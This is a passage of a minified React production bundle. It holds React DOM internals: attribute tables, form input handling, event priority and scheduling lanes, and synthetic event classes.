/*! For license information please see main.a4dfc5ce.js.LICENSE.txt */
(()=>{"use strict";var e={730(e,t,n){var r=n(43),a=n(853);function i(e){for(var t="https://reactjs.org/docs/error-decoder.html?invariant="+e,n=1;n<arguments.length;n++)t+="&args[]="+encodeURIComponent(arguments[n]);return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var s=new Set,o={};function l(e,t){c(e,t),c(e+"Capture",t)}function c(e,t){for(o[e]=t,e=0;e<t.length;e++)s.add(t[e])}var u=!("undefined"===typeof window||"undefined"===typeof window.document||"undefined"===typeof window.document.createElement),d=Object.prototype.hasOwnProperty,p=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,h={},f={};function m(e,t,n,r,a,i,s){this.acceptsBooleans=2===t||3===t||4===t,this.attributeName=r,this.attributeNamespace=a,this.mustUseProperty=n,this.propertyName=e,this.type=t,this.sanitizeURL=i,this.removeEmptyString=s}var g={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){g[e]=new m(e,0,!1,e,null,!1,!1)}),[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var t=e[0];g[t]=new m(t,1,!1,e[1],null,!1,!1)}),["contentEditable","draggable","spellCheck","value"].forEach(function(e){g[e]=new m(e,2,!1,e.toLowerCase(),null,!1,!1)}),["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){g[e]=new m(e,2,!1,e,null,!1,!1)}),"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){g[e]=new m(e,3,!1,e.toLowerCase(),null,!1,!1)}),["checked","multiple","muted","selected"].forEach(function(e){g[e]=new m(e,3,!0,e,null,!1,!1)}),["capture","download"].forEach(function(e){g[e]=new m(e,4,!1,e,null,!1,!1)}),["cols","rows","size","span"].forEach(function(e){g[e]=new m(e,6,!1,e,null,!1,!1)}),["rowSpan","start"].forEach(function(e){g[e]=new m(e,5,!1,e.toLowerCase(),null,!1,!1)});var y=/[\-:]([a-z])/g;function v(e){return e[1].toUpperCase()}function x(e,t,n,r){var a=g.hasOwnProperty(t)?g[t]:null;(null!==a?0!==a.type:r||!(2<t.length)||"o"!==t[0]&&"O"!==t[0]||"n"!==t[1]&&"N"!==t[1])&&(function(e,t,n,r){if(null===t||"undefined"===typeof t||function(e,t,n,r){if(null!==n&&0===n.type)return!1;switch(typeof t){case"function":case"symbol":return!0;case"boolean":return!r&&(null!==n?!n.acceptsBooleans:"data-"!==(e=e.toLowerCase().slice(0,5))&&"aria-"!==e);default:return!1}}(e,t,n,r))return!0;if(r)return!1;if(null!==n)switch(n.type){case 3:return!t;case 4:return!1===t;case 5:return isNaN(t);case 6:return isNaN(t)||1>t}return!1}(t,n,a,r)&&(n=null),r||null===a?function(e){return!!d.call(f,e)||!d.call(h,e)&&(p.test(e)?f[e]=!0:(h[e]=!0,!1))}(t)&&(null===n?e.removeAttribute(t):e.setAttribute(t,""+n)):a.mustUseProperty?e[a.propertyName]=null===n?3!==a.type&&"":n:(t=a.attributeName,r=a.attributeNamespace,null===n?e.removeAttribute(t):(n=3===(a=a.type)||4===a&&!0===n?"":""+n,r?e.setAttributeNS(r,t,n):e.setAttribute(t,n))))}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var t=e.replace(y,v);g[t]=new m(t,1,!1,e,null,!1,!1)}),"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var t=e.replace(y,v);g[t]=new m(t,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)}),["xml:base","xml:lang","xml:space"].forEach(function(e){var t=e.replace(y,v);g[t]=new m(t,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)}),["tabIndex","crossOrigin"].forEach(function(e){g[e]=new m(e,1,!1,e.toLowerCase(),null,!1,!1)}),g.xlinkHref=new m("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1),["src","href","action","formAction"].forEach(function(e){g[e]=new m(e,1,!1,e.toLowerCase(),null,!0,!0)});var b=r.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,w=Symbol.for("react.element"),k=Symbol.for("react.portal"),j=Symbol.for("react.fragment"),N=Symbol.for("react.strict_mode"),S=Symbol.for("react.profiler"),C=Symbol.for("react.provider"),A=Symbol.for("react.context"),P=Symbol.for("react.forward_ref"),T=Symbol.for("react.suspense"),q=Symbol.for("react.suspense_list"),E=Symbol.for("react.memo"),L=Symbol.for("react.lazy");Symbol.for("react.scope"),Symbol.for("react.debug_trace_mode");var R=Symbol.for("react.offscreen");Symbol.for("react.legacy_hidden"),Symbol.for("react.cache"),Symbol.for("react.tracing_marker");var O=Symbol.iterator;function F(e){return null===e||"object"!==typeof e?null:"function"===typeof(e=O&&e[O]||e["@@iterator"])?e:null}var I,M=Object.assign;function D(e){if(void 0===I)try{throw Error()}catch(n){var t=n.stack.trim().match(/\n( *(at )?)/);I=t&&t[1]||""}return"\n"+I+e}var _=!1;function B(e,t){if(!e||_)return"";_=!0;var n=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(t)if(t=function(){throw Error()},Object.defineProperty(t.prototype,"props",{set:function(){throw Error()}}),"object"===typeof Reflect&&Reflect.construct){try{Reflect.construct(t,[])}catch(c){var r=c}Reflect.construct(e,[],t)}else{try{t.call()}catch(c){r=c}e.call(t.prototype)}else{try{throw Error()}catch(c){r=c}e()}}catch(c){if(c&&r&&"string"===typeof c.stack){for(var a=c.stack.split("\n"),i=r.stack.split("\n"),s=a.length-1,o=i.length-1;1<=s&&0<=o&&a[s]!==i[o];)o--;for(;1<=s&&0<=o;s--,o--)if(a[s]!==i[o]){if(1!==s||1!==o)do{if(s--,0>--o||a[s]!==i[o]){var l="\n"+a[s].replace(" at new "," at ");return e.displayName&&l.includes("<anonymous>")&&(l=l.replace("<anonymous>",e.displayName)),l}}while(1<=s&&0<=o);break}}}finally{_=!1,Error.prepareStackTrace=n}return(e=e?e.displayName||e.name:"")?D(e):""}function z(e){switch(e.tag){case 5:return D(e.type);case 16:return D("Lazy");case 13:return D("Suspense");case 19:return D("SuspenseList");case 0:case 2:case 15:return e=B(e.type,!1);case 11:return e=B(e.type.render,!1);case 1:return e=B(e.type,!0);default:return""}}function W(e){if(null==e)return null;if("function"===typeof e)return e.displayName||e.name||null;if("string"===typeof e)return e;switch(e){case j:return"Fragment";case k:return"Portal";case S:return"Profiler";case N:return"StrictMode";case T:return"Suspense";case q:return"SuspenseList"}if("object"===typeof e)switch(e.$$typeof){case A:return(e.displayName||"Context")+".Consumer";case C:return(e._context.displayName||"Context")+".Provider";case P:var t=e.render;return(e=e.displayName)||(e=""!==(e=t.displayName||t.name||"")?"ForwardRef("+e+")":"ForwardRef"),e;case E:return null!==(t=e.displayName||null)?t:W(e.type)||"Memo";case L:t=e._payload,e=e._init;try{return W(e(t))}catch(n){}}return null}function H(e){var t=e.type;switch(e.tag){case 24:return"Cache";case 9:return(t.displayName||"Context")+".Consumer";case 10:return(t._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=(e=t.render).displayName||e.name||"",t.displayName||(""!==e?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return t;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return W(t);case 8:return t===N?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if("function"===typeof t)return t.displayName||t.name||null;if("string"===typeof t)return t}return null}function U(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":case"object":return e;default:return""}}function V(e){var t=e.type;return(e=e.nodeName)&&"input"===e.toLowerCase()&&("checkbox"===t||"radio"===t)}function $(e){e._valueTracker||(e._valueTracker=function(e){var t=V(e)?"checked":"value",n=Object.getOwnPropertyDescriptor(e.constructor.prototype,t),r=""+e[t];if(!e.hasOwnProperty(t)&&"undefined"!==typeof n&&"function"===typeof n.get&&"function"===typeof n.set){var a=n.get,i=n.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return a.call(this)},set:function(e){r=""+e,i.call(this,e)}}),Object.defineProperty(e,t,{enumerable:n.enumerable}),{getValue:function(){return r},setValue:function(e){r=""+e},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}(e))}function G(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var n=t.getValue(),r="";return e&&(r=V(e)?e.checked?"true":"false":e.value),(e=r)!==n&&(t.setValue(e),!0)}function Q(e){if("undefined"===typeof(e=e||("undefined"!==typeof document?document:void 0)))return null;try{return e.activeElement||e.body}catch(t){return e.body}}function K(e,t){var n=t.checked;return M({},t,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:null!=n?n:e._wrapperState.initialChecked})}function Y(e,t){var n=null==t.defaultValue?"":t.defaultValue,r=null!=t.checked?t.checked:t.defaultChecked;n=U(null!=t.value?t.value:n),e._wrapperState={initialChecked:r,initialValue:n,controlled:"checkbox"===t.type||"radio"===t.type?null!=t.checked:null!=t.value}}function X(e,t){null!=(t=t.checked)&&x(e,"checked",t,!1)}function J(e,t){X(e,t);var n=U(t.value),r=t.type;if(null!=n)"number"===r?(0===n&&""===e.value||e.value!=n)&&(e.value=""+n):e.value!==""+n&&(e.value=""+n);else if("submit"===r||"reset"===r)return void e.removeAttribute("value");t.hasOwnProperty("value")?ee(e,t.type,n):t.hasOwnProperty("defaultValue")&&ee(e,t.type,U(t.defaultValue)),null==t.checked&&null!=t.defaultChecked&&(e.defaultChecked=!!t.defaultChecked)}function Z(e,t,n){if(t.hasOwnProperty("value")||t.hasOwnProperty("defaultValue")){var r=t.type;if(!("submit"!==r&&"reset"!==r||void 0!==t.value&&null!==t.value))return;t=""+e._wrapperState.initialValue,n||t===e.value||(e.value=t),e.defaultValue=t}""!==(n=e.name)&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,""!==n&&(e.name=n)}function ee(e,t,n){"number"===t&&Q(e.ownerDocument)===e||(null==n?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+n&&(e.defaultValue=""+n))}var te=Array.isArray;function ne(e,t,n,r){if(e=e.options,t){t={};for(var a=0;a<n.length;a++)t["$"+n[a]]=!0;for(n=0;n<e.length;n++)a=t.hasOwnProperty("$"+e[n].value),e[n].selected!==a&&(e[n].selected=a),a&&r&&(e[n].defaultSelected=!0)}else{for(n=""+U(n),t=null,a=0;a<e.length;a++){if(e[a].value===n)return e[a].selected=!0,void(r&&(e[a].defaultSelected=!0));null!==t||e[a].disabled||(t=e[a])}null!==t&&(t.selected=!0)}}function re(e,t){if(null!=t.dangerouslySetInnerHTML)throw Error(i(91));return M({},t,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function ae(e,t){var n=t.value;if(null==n){if(n=t.children,t=t.defaultValue,null!=n){if(null!=t)throw Error(i(92));if(te(n)){if(1<n.length)throw Error(i(93));n=n[0]}t=n}null==t&&(t=""),n=t}e._wrapperState={initialValue:U(n)}}function ie(e,t){var n=U(t.value),r=U(t.defaultValue);null!=n&&((n=""+n)!==e.value&&(e.value=n),null==t.defaultValue&&e.defaultValue!==n&&(e.defaultValue=n)),null!=r&&(e.defaultValue=""+r)}function se(e){var t=e.textContent;t===e._wrapperState.initialValue&&""!==t&&null!==t&&(e.value=t)}function oe(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function le(e,t){return null==e||"http://www.w3.org/1999/xhtml"===e?oe(t):"http://www.w3.org/2000/svg"===e&&"foreignObject"===t?"http://www.w3.org/1999/xhtml":e}var ce,ue,de=(ue=function(e,t){if("http://www.w3.org/2000/svg"!==e.namespaceURI||"innerHTML"in e)e.innerHTML=t;else{for((ce=ce||document.createElement("div")).innerHTML="<svg>"+t.valueOf().toString()+"</svg>",t=ce.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;t.firstChild;)e.appendChild(t.firstChild)}},"undefined"!==typeof MSApp&&MSApp.execUnsafeLocalFunction?function(e,t,n,r){MSApp.execUnsafeLocalFunction(function(){return ue(e,t)})}:ue);function pe(e,t){if(t){var n=e.firstChild;if(n&&n===e.lastChild&&3===n.nodeType)return void(n.nodeValue=t)}e.textContent=t}var he={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},fe=["Webkit","ms","Moz","O"];function me(e,t,n){return null==t||"boolean"===typeof t||""===t?"":n||"number"!==typeof t||0===t||he.hasOwnProperty(e)&&he[e]?(""+t).trim():t+"px"}function ge(e,t){for(var n in e=e.style,t)if(t.hasOwnProperty(n)){var r=0===n.indexOf("--"),a=me(n,t[n],r);"float"===n&&(n="cssFloat"),r?e.setProperty(n,a):e[n]=a}}Object.keys(he).forEach(function(e){fe.forEach(function(t){t=t+e.charAt(0).toUpperCase()+e.substring(1),he[t]=he[e]})});var ye=M({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function ve(e,t){if(t){if(ye[e]&&(null!=t.children||null!=t.dangerouslySetInnerHTML))throw Error(i(137,e));if(null!=t.dangerouslySetInnerHTML){if(null!=t.children)throw Error(i(60));if("object"!==typeof t.dangerouslySetInnerHTML||!("__html"in t.dangerouslySetInnerHTML))throw Error(i(61))}if(null!=t.style&&"object"!==typeof t.style)throw Error(i(62))}}function xe(e,t){if(-1===e.indexOf("-"))return"string"===typeof t.is;switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var be=null;function we(e){return(e=e.target||e.srcElement||window).correspondingUseElement&&(e=e.correspondingUseElement),3===e.nodeType?e.parentNode:e}var ke=null,je=null,Ne=null;function Se(e){if(e=xa(e)){if("function"!==typeof ke)throw Error(i(280));var t=e.stateNode;t&&(t=wa(t),ke(e.stateNode,e.type,t))}}function Ce(e){je?Ne?Ne.push(e):Ne=[e]:je=e}function Ae(){if(je){var e=je,t=Ne;if(Ne=je=null,Se(e),t)for(e=0;e<t.length;e++)Se(t[e])}}function Pe(e,t){return e(t)}function Te(){}var qe=!1;function Ee(e,t,n){if(qe)return e(t,n);qe=!0;try{return Pe(e,t,n)}finally{qe=!1,(null!==je||null!==Ne)&&(Te(),Ae())}}function Le(e,t){var n=e.stateNode;if(null===n)return null;var r=wa(n);if(null===r)return null;n=r[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(r=!("button"===(e=e.type)||"input"===e||"select"===e||"textarea"===e)),e=!r;break e;default:e=!1}if(e)return null;if(n&&"function"!==typeof n)throw Error(i(231,t,typeof n));return n}var Re=!1;if(u)try{var Oe={};Object.defineProperty(Oe,"passive",{get:function(){Re=!0}}),window.addEventListener("test",Oe,Oe),window.removeEventListener("test",Oe,Oe)}catch(ue){Re=!1}function Fe(e,t,n,r,a,i,s,o,l){var c=Array.prototype.slice.call(arguments,3);try{t.apply(n,c)}catch(u){this.onError(u)}}var Ie=!1,Me=null,De=!1,_e=null,Be={onError:function(e){Ie=!0,Me=e}};function ze(e,t,n,r,a,i,s,o,l){Ie=!1,Me=null,Fe.apply(Be,arguments)}function We(e){var t=e,n=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do{0!==(4098&(t=e).flags)&&(n=t.return),e=t.return}while(e)}return 3===t.tag?n:null}function He(e){if(13===e.tag){var t=e.memoizedState;if(null===t&&(null!==(e=e.alternate)&&(t=e.memoizedState)),null!==t)return t.dehydrated}return null}function Ue(e){if(We(e)!==e)throw Error(i(188))}function Ve(e){return null!==(e=function(e){var t=e.alternate;if(!t){if(null===(t=We(e)))throw Error(i(188));return t!==e?null:e}for(var n=e,r=t;;){var a=n.return;if(null===a)break;var s=a.alternate;if(null===s){if(null!==(r=a.return)){n=r;continue}break}if(a.child===s.child){for(s=a.child;s;){if(s===n)return Ue(a),e;if(s===r)return Ue(a),t;s=s.sibling}throw Error(i(188))}if(n.return!==r.return)n=a,r=s;else{for(var o=!1,l=a.child;l;){if(l===n){o=!0,n=a,r=s;break}if(l===r){o=!0,r=a,n=s;break}l=l.sibling}if(!o){for(l=s.child;l;){if(l===n){o=!0,n=s,r=a;break}if(l===r){o=!0,r=s,n=a;break}l=l.sibling}if(!o)throw Error(i(189))}}if(n.alternate!==r)throw Error(i(190))}if(3!==n.tag)throw Error(i(188));return n.stateNode.current===n?e:t}(e))?$e(e):null}function $e(e){if(5===e.tag||6===e.tag)return e;for(e=e.child;null!==e;){var t=$e(e);if(null!==t)return t;e=e.sibling}return null}var Ge=a.unstable_scheduleCallback,Qe=a.unstable_cancelCallback,Ke=a.unstable_shouldYield,Ye=a.unstable_requestPaint,Xe=a.unstable_now,Je=a.unstable_getCurrentPriorityLevel,Ze=a.unstable_ImmediatePriority,et=a.unstable_UserBlockingPriority,tt=a.unstable_NormalPriority,nt=a.unstable_LowPriority,rt=a.unstable_IdlePriority,at=null,it=null;var st=Math.clz32?Math.clz32:function(e){return e>>>=0,0===e?32:31-(ot(e)/lt|0)|0},ot=Math.log,lt=Math.LN2;var ct=64,ut=4194304;function dt(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return 4194240&e;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return 130023424&e;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function pt(e,t){var n=e.pendingLanes;if(0===n)return 0;var r=0,a=e.suspendedLanes,i=e.pingedLanes,s=268435455&n;if(0!==s){var o=s&~a;0!==o?r=dt(o):0!==(i&=s)&&(r=dt(i))}else 0!==(s=n&~a)?r=dt(s):0!==i&&(r=dt(i));if(0===r)return 0;if(0!==t&&t!==r&&0===(t&a)&&((a=r&-r)>=(i=t&-t)||16===a&&0!==(4194240&i)))return t;if(0!==(4&r)&&(r|=16&n),0!==(t=e.entangledLanes))for(e=e.entanglements,t&=r;0<t;)a=1<<(n=31-st(t)),r|=e[n],t&=~a;return r}function ht(e,t){switch(e){case 1:case 2:case 4:return t+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;default:return-1}}function ft(e){return 0!==(e=-1073741825&e.pendingLanes)?e:1073741824&e?1073741824:0}function mt(){var e=ct;return 0===(4194240&(ct<<=1))&&(ct=64),e}function gt(e){for(var t=[],n=0;31>n;n++)t.push(e);return t}function yt(e,t,n){e.pendingLanes|=t,536870912!==t&&(e.suspendedLanes=0,e.pingedLanes=0),(e=e.eventTimes)[t=31-st(t)]=n}function vt(e,t){var n=e.entangledLanes|=t;for(e=e.entanglements;n;){var r=31-st(n),a=1<<r;a&t|e[r]&t&&(e[r]|=t),n&=~a}}var xt=0;function bt(e){return 1<(e&=-e)?4<e?0!==(268435455&e)?16:536870912:4:1}var wt,kt,jt,Nt,St,Ct=!1,At=[],Pt=null,Tt=null,qt=null,Et=new Map,Lt=new Map,Rt=[],Ot="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Ft(e,t){switch(e){case"focusin":case"focusout":Pt=null;break;case"dragenter":case"dragleave":Tt=null;break;case"mouseover":case"mouseout":qt=null;break;case"pointerover":case"pointerout":Et.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":Lt.delete(t.pointerId)}}function It(e,t,n,r,a,i){return null===e||e.nativeEvent!==i?(e={blockedOn:t,domEventName:n,eventSystemFlags:r,nativeEvent:i,targetContainers:[a]},null!==t&&(null!==(t=xa(t))&&kt(t)),e):(e.eventSystemFlags|=r,t=e.targetContainers,null!==a&&-1===t.indexOf(a)&&t.push(a),e)}function Mt(e){var t=va(e.target);if(null!==t){var n=We(t);if(null!==n)if(13===(t=n.tag)){if(null!==(t=He(n)))return e.blockedOn=t,void St(e.priority,function(){jt(n)})}else if(3===t&&n.stateNode.current.memoizedState.isDehydrated)return void(e.blockedOn=3===n.tag?n.stateNode.containerInfo:null)}e.blockedOn=null}function Dt(e){if(null!==e.blockedOn)return!1;for(var t=e.targetContainers;0<t.length;){var n=Kt(e.domEventName,e.eventSystemFlags,t[0],e.nativeEvent);if(null!==n)return null!==(t=xa(n))&&kt(t),e.blockedOn=n,!1;var r=new(n=e.nativeEvent).constructor(n.type,n);be=r,n.target.dispatchEvent(r),be=null,t.shift()}return!0}function _t(e,t,n){Dt(e)&&n.delete(t)}function Bt(){Ct=!1,null!==Pt&&Dt(Pt)&&(Pt=null),null!==Tt&&Dt(Tt)&&(Tt=null),null!==qt&&Dt(qt)&&(qt=null),Et.forEach(_t),Lt.forEach(_t)}function zt(e,t){e.blockedOn===t&&(e.blockedOn=null,Ct||(Ct=!0,a.unstable_scheduleCallback(a.unstable_NormalPriority,Bt)))}function Wt(e){function t(t){return zt(t,e)}if(0<At.length){zt(At[0],e);for(var n=1;n<At.length;n++){var r=At[n];r.blockedOn===e&&(r.blockedOn=null)}}for(null!==Pt&&zt(Pt,e),null!==Tt&&zt(Tt,e),null!==qt&&zt(qt,e),Et.forEach(t),Lt.forEach(t),n=0;n<Rt.length;n++)(r=Rt[n]).blockedOn===e&&(r.blockedOn=null);for(;0<Rt.length&&null===(n=Rt[0]).blockedOn;)Mt(n),null===n.blockedOn&&Rt.shift()}var Ht=b.ReactCurrentBatchConfig,Ut=!0;function Vt(e,t,n,r){var a=xt,i=Ht.transition;Ht.transition=null;try{xt=1,Gt(e,t,n,r)}finally{xt=a,Ht.transition=i}}function $t(e,t,n,r){var a=xt,i=Ht.transition;Ht.transition=null;try{xt=4,Gt(e,t,n,r)}finally{xt=a,Ht.transition=i}}function Gt(e,t,n,r){if(Ut){var a=Kt(e,t,n,r);if(null===a)Ur(e,t,r,Qt,n),Ft(e,r);else if(function(e,t,n,r,a){switch(t){case"focusin":return Pt=It(Pt,e,t,n,r,a),!0;case"dragenter":return Tt=It(Tt,e,t,n,r,a),!0;case"mouseover":return qt=It(qt,e,t,n,r,a),!0;case"pointerover":var i=a.pointerId;return Et.set(i,It(Et.get(i)||null,e,t,n,r,a)),!0;case"gotpointercapture":return i=a.pointerId,Lt.set(i,It(Lt.get(i)||null,e,t,n,r,a)),!0}return!1}(a,e,t,n,r))r.stopPropagation();else if(Ft(e,r),4&t&&-1<Ot.indexOf(e)){for(;null!==a;){var i=xa(a);if(null!==i&&wt(i),null===(i=Kt(e,t,n,r))&&Ur(e,t,r,Qt,n),i===a)break;a=i}null!==a&&r.stopPropagation()}else Ur(e,t,r,null,n)}}var Qt=null;function Kt(e,t,n,r){if(Qt=null,null!==(e=va(e=we(r))))if(null===(t=We(e)))e=null;else if(13===(n=t.tag)){if(null!==(e=He(t)))return e;e=null}else if(3===n){if(t.stateNode.current.memoizedState.isDehydrated)return 3===t.tag?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null);return Qt=e,null}function Yt(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Je()){case Ze:return 1;case et:return 4;case tt:case nt:return 16;case rt:return 536870912;default:return 16}default:return 16}}var Xt=null,Jt=null,Zt=null;function en(){if(Zt)return Zt;var e,t,n=Jt,r=n.length,a="value"in Xt?Xt.value:Xt.textContent,i=a.length;for(e=0;e<r&&n[e]===a[e];e++);var s=r-e;for(t=1;t<=s&&n[r-t]===a[i-t];t++);return Zt=a.slice(e,1<t?1-t:void 0)}function tn(e){var t=e.keyCode;return"charCode"in e?0===(e=e.charCode)&&13===t&&(e=13):e=t,10===e&&(e=13),32<=e||13===e?e:0}function nn(){return!0}function rn(){return!1}function an(e){function t(t,n,r,a,i){for(var s in this._reactName=t,this._targetInst=r,this.type=n,this.nativeEvent=a,this.target=i,this.currentTarget=null,e)e.hasOwnProperty(s)&&(t=e[s],this[s]=t?t(a):a[s]);return this.isDefaultPrevented=(null!=a.defaultPrevented?a.defaultPrevented:!1===a.returnValue)?nn:rn,this.isPropagationStopped=rn,this}return M(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var e=this.nativeEvent;e&&(e.preventDefault?e.preventDefault():"unknown"!==typeof e.returnValue&&(e.returnValue=!1),this.isDefaultPrevented=nn)},stopPropagation:function(){var e=this.nativeEvent;e&&(e.stopPropagation?e.stopPropagation():"unknown"!==typeof e.cancelBubble&&(e.cancelBubble=!0),this.isPropagationStopped=nn)},persist:function(){},isPersistent:nn}),t}var sn,on,ln,cn={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},un=an(cn),dn=M({},cn,{view:0,detail:0}),pn=an(dn),hn=M({},dn,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Sn,button:0,buttons:0,relatedTarget:function(e){return void 0===e.relatedTarget?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==ln&&(ln&&"mousemove"===e.type?(sn=e.screenX-ln.screenX,on=e.screenY-ln.screenY):on=sn=0,ln=e),sn)},movementY:function(e){return"movementY"in e?e.movementY:on}}),fn=an(hn),mn=an(M({},hn,{dataTransfer:0})),gn=an(M({},dn,{relatedTarget:0})),yn=an(M({},cn,{animationName:0,elapsedTime:0,pseudoElement:0})),vn=M({},cn,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),xn=an(vn),bn=an(M({},cn,{data:0})),wn={Esc:"Escape",Spacebar:" 